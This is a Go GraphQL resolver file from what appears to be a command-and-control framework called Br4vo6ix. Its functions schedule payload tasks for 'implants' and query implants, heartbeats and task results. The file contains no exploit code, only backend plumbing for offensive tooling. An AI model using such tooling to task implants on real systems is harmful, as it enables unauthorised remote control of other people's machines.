package graph

// This file will be automatically regenerated based on the schema, any resolver implementations
// will be copied through when generating and any unknown code will be moved to the end.

import (
	"context"
	"fmt"

	"github.com/BradHacker/Br4vo6ix/ent"
	"github.com/BradHacker/Br4vo6ix/ent/implant"
	"github.com/BradHacker/Br4vo6ix/ent/task"
	"github.com/BradHacker/Br4vo6ix/graph/generated"
	"github.com/BradHacker/Br4vo6ix/graph/model"
	"github.com/google/uuid"
)

func (r *mutationResolver) ScheduleTask(ctx context.Context, input model.NewTaskInput) (*ent.Task, error) {
	imp, err := r.client.Implant.Query().Where(implant.UUIDEQ(input.ImplantUUID)).Only(ctx)
	if err != nil {
		return nil, fmt.Errorf("error getting implant: %v", err)
	}

	newTask, err := r.client.Task.Create().
		SetUUID(uuid.NewString()).
		SetImplant(imp).
		SetPayload(input.Payload).
		SetType(task.Type(input.Type)).
		SetStdout("").
		SetStderr("").
		Save(ctx)
	if err != nil {
		return nil, err
	}
	return newTask, nil
}

func (r *queryResolver) Implants(ctx context.Context) ([]*ent.Implant, error) {
	implants, err := r.client.Implant.Query().WithHeartbeats().WithTasks(func(q *ent.TaskQuery) {
		q.Order(ent.Desc(task.FieldCreatedAt))
		q.Limit(5)
	}).All(ctx)
	if err != nil {
		return nil, fmt.Errorf("error creating task: %v", err)
	}
	return implants, nil
}

func (r *queryResolver) Implant(ctx context.Context, implantUUID string) (*ent.Implant, error) {
	implant, err := r.client.Implant.Query().Where(implant.UUIDEQ(implantUUID)).Only(ctx)
	if err != nil {
		return nil, fmt.Errorf("error querying implant: %v", err)
	}
	return implant, nil
}

func (r *queryResolver) Tasks(ctx context.Context, implantUUID string) ([]*ent.Task, error) {
	tasks, err := r.client.Implant.Query().Where(implant.UUIDEQ(implantUUID)).QueryTasks().All(ctx)
	if err != nil {
		return nil, fmt.Errorf("error querying tasks: %v", err)
	}
	return tasks, nil
}

func (r *taskResolver) Type(ctx context.Context, obj *ent.Task) (model.TaskType, error) {
	return model.TaskType(obj.Type), nil
}

// Mutation returns generated.MutationResolver implementation.
func (r *Resolver) Mutation() generated.MutationResolver { return &mutationResolver{r} }

// Query returns generated.QueryResolver implementation.
func (r *Resolver) Query() generated.QueryResolver { return &queryResolver{r} }

// Task returns generated.TaskResolver implementation.
func (r *Resolver) Task() generated.TaskResolver { return &taskResolver{r} }

type mutationResolver struct{ *Resolver }
type queryResolver struct{ *Resolver }
type taskResolver struct{ *Resolver }
